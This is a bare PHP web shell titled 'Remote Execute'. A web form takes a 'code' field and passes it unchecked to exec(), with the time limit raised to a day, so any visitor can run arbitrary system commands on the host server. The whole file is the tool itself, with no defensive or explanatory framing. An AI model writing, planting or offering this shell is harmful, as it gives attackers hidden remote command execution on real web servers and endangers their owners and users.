<title>Remote Execute </title>
<center>
</br</p></br</p><form method="post">
<input name="code" size="100" />
<input name="submit" type="submit" />
</form>

<?php

// maximum execution time in seconds
set_time_limit (24 * 60 * 60);

if (!isset($_POST['submit'])) die();


$code = $_POST['code'];
exec("$code");
$_POST['url'] = ("");
$code = ("");
echo $code;

?>
</center>
